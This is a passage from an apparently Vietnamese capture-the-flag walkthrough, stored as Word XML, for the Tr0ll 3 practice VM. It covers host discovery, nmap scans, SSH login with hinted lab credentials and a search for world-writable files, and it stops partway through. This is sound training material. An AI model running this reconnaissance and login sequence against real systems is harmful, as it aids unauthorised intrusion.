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0D04" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>TR0LL 3 ENUMERATION AND EXPLOITATION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70FAFE22" w14:textId="030AA0E0" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:t>IP máy Tr0ll 3: 192.168.56.1</w:t>
      </w:r>
      <w:r w:rsidR="0072187C">
        <w:t>16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F45A95" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:t>IP máy Kali: 192.168.56.105</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2443E644" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Đường dẫn tải máy ảo và tài nguyên: </w:t>
      </w:r>
      <w:hyperlink r:id="rId6">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Google Drive</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5BE573E7" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>1. Dò quét mạng và dịch vụ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9C3D69" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Xác định địa chỉ IP của máy mục tiêu trong mạng nội bộ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60ECAC79" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A19B29" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>netdiscover -i eth1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CCA61BD" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Netdiscover quét các thiết bị đang hoạt động trên giao diện eth1 và hiển thị địa chỉ IP, địa chỉ MAC của các máy trong cùng mạng. Ghi lại IP của máy Tr0ll 3 để dùng cho các bước tiếp theo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC99209" w14:textId="3D2CE42D" w:rsidR="00854BD8" w:rsidRDefault="0072187C">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7E3A7A45" wp14:editId="49E6CDBD">
            <wp:extent cx="6152515" cy="1694180"/>
            <wp:effectExtent l="0" t="0" r="635" b="1270"/>
            <wp:docPr id="193965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55234" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1694180"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Nhận diện cổng mở, hệ điều hành và phiên bản dịch vụ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F41A31" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9DA91C" w14:textId="134CD7AD" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>nmap -A 192.168.56.1</w:t>
      </w:r>
      <w:r w:rsidR="0072187C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="576D72CF" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tùy chọn -A kích hoạt nhận diện hệ điều hành, phiên bản dịch vụ, script mặc định và traceroute. Kết quả cho biết các dịch vụ đang được cung cấp trên máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9C6EE9" w14:textId="77777777" w:rsidR="0072187C" w:rsidRDefault="0072187C">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3ED228CC" wp14:editId="20FA5370">
            <wp:extent cx="6152515" cy="3086100"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="64301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13544" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="3086100"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E086C9A" w14:textId="288F1469" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Kiểm tra chi tiết dịch vụ SSH tại cổng 22.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243B4D87" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1219F802" w14:textId="45880BA9" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>nmap -p22 --script "default, safe" 192.168.56.1</w:t>
      </w:r>
      <w:r w:rsidR="0072187C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094C0E8A" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lệnh giới hạn quét tại cổng 22 và chạy các NSE script thuộc nhóm default và safe để thu thập thêm thông tin về SSH.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169A0392" w14:textId="77777777" w:rsidR="0072187C" w:rsidRDefault="0072187C">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2EE699B8" wp14:editId="078A0264">
            <wp:extent cx="6152515" cy="4240530"/>
            <wp:effectExtent l="0" t="0" r="635" b="7620"/>
            <wp:docPr id="19724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91839" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="4240530"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="490AF5C8" w14:textId="652CE650" w:rsidR="0072187C" w:rsidRDefault="0072187C">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="068C7DC8" wp14:editId="29BA0ACF">
            <wp:extent cx="6152515" cy="1874520"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="816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1072" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1874520"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F4A250" w14:textId="77777777" w:rsidR="0072187C" w:rsidRPr="0072187C" w:rsidRDefault="0072187C" w:rsidP="0072187C">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0072187C">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Thực hiện quét máy mục tiêu 192.168.56.116.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2803A5A9" w14:textId="77777777" w:rsidR="0072187C" w:rsidRPr="0072187C" w:rsidRDefault="0072187C" w:rsidP="0072187C">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0072187C">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Kết quả cho thấy cổng 22/tcp đang mở.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF704FC" w14:textId="77777777" w:rsidR="0072187C" w:rsidRPr="0072187C" w:rsidRDefault="0072187C" w:rsidP="0072187C">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0072187C">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Cổng 22 đang chạy dịch vụ SSH với phiên bản OpenSSH 7.6p1 Ubuntu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5587010D" w14:textId="77777777" w:rsidR="0072187C" w:rsidRPr="0072187C" w:rsidRDefault="0072187C" w:rsidP="0072187C">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0072187C">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Quan sát màn hình máy chủ phát hiện thông tin gợi ý đăng nhập Login: start:here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="374030D5" w14:textId="77777777" w:rsidR="0072187C" w:rsidRPr="0072187C" w:rsidRDefault="0072187C" w:rsidP="0072187C">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0072187C">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Từ thông tin trên, xác định tài khoản đăng nhập là </w:t>
      </w:r>
      <w:r w:rsidRPr="0072187C">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>start</w:t>
      </w:r>
      <w:r w:rsidRPr="0072187C">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> và mật khẩu là </w:t>
      </w:r>
      <w:r w:rsidRPr="0072187C">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>here</w:t>
      </w:r>
      <w:r w:rsidRPr="0072187C">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65AFDBD5" w14:textId="77777777" w:rsidR="0072187C" w:rsidRDefault="0072187C">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51C295CE" w14:textId="140ECB4D" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>2. Truy cập ban đầu và thu thập manh mối</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F9EA76" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Đăng nhập máy mục tiêu bằng tài khoản start.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA4768C" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0664D638" w14:textId="6C2B3CD3" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>ssh start@192.168.56.1</w:t>
      </w:r>
      <w:r w:rsidR="0072187C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="657AD179" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Khởi tạo phiên SSH bằng tài khoản start. Sau khi đăng nhập, kiểm tra các thư mục và file có sẵn để tìm manh mối.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79930C26" w14:textId="1AE02D22" w:rsidR="00C46C15" w:rsidRDefault="00C46C15">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="253042A7" wp14:editId="73145F12">
            <wp:extent cx="6152515" cy="2204085"/>
            <wp:effectExtent l="0" t="0" r="635" b="5715"/>
            <wp:docPr id="29312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25044" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2204085"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="58DC7B19" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Kiểm tra nội dung hai thư mục bluepill và redpill.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6B4CF2" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="387391BE" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>cd bluepill</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44AAF7D8" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF300CB" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>cd redpill</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E725818" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Truy cập lần lượt hai thư mục để đọc các thông tin bên trong. So sánh các manh mối và xác định dữ liệu cần thiết cho tài khoản tiếp theo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2805BE" w14:textId="77777777" w:rsidR="00C46C15" w:rsidRDefault="00C46C15">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3F2A6056" wp14:editId="2D6B2E56">
            <wp:extent cx="6152515" cy="2400300"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="122594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45613" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId12"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2400300"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5334FB" w14:textId="48909370" w:rsidR="00C46C15" w:rsidRPr="00C46C15" w:rsidRDefault="00C46C15">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Truy cập vào đường dẫn vừa tìm được nhưng k thu được gì cả vì vậy tôi sẽ thử đăng nhập bằng tài khoản </w:t>
      </w:r>
      <w:r w:rsidRPr="00C46C15">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>step2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> với mk </w:t>
      </w:r>
      <w:r w:rsidRPr="00C46C15">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>Pas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00C46C15">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>word1!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53CC552A" w14:textId="77777777" w:rsidR="00C46C15" w:rsidRDefault="00C46C15">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59CCD862" w14:textId="407140B6" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Đăng nhập bằng tài khoản step2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2295FD66" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F26E4B4" w14:textId="583F3EB8" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>ssh step2@192.168.56.1</w:t>
      </w:r>
      <w:r w:rsidR="0072187C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4220C580" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Sử dụng thông tin xác thực tìm được từ bước trước để mở phiên SSH mới với quyền của người dùng step2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73BF937F" w14:textId="77777777" w:rsidR="00C46C15" w:rsidRDefault="00C46C15">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="161CA7CD" wp14:editId="2AD4C198">
            <wp:extent cx="6152515" cy="1589405"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="155470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09602" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1589405"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C16FA6" w14:textId="59A4363A" w:rsidR="00C46C15" w:rsidRPr="00DA4299" w:rsidRDefault="00DA4299">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> đăng nhập ko được .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501564E5" w14:textId="178A6E98" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>3. Tìm file đặc biệt và phân tích dữ liệu bắt gói</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCC93B6" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tìm các file có quyền 0777 trên toàn hệ thống.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464B83E2" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0F5BFA" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>find / -type f -perm 0777 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A486EB9" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lệnh tìm các file mà mọi người dùng đều có quyền đọc, ghi và thực thi. Phần 2&gt;/dev/null ẩn các thông báo không có quyền truy cập.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A48950" w14:textId="77777777" w:rsidR="00DA4299" w:rsidRDefault="00DA4299">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="65B35AF5" wp14:editId="5B55D506">
            <wp:extent cx="6152515" cy="331470"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="54043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36710" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId14"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="331470"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A79197" w14:textId="06DA2405" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
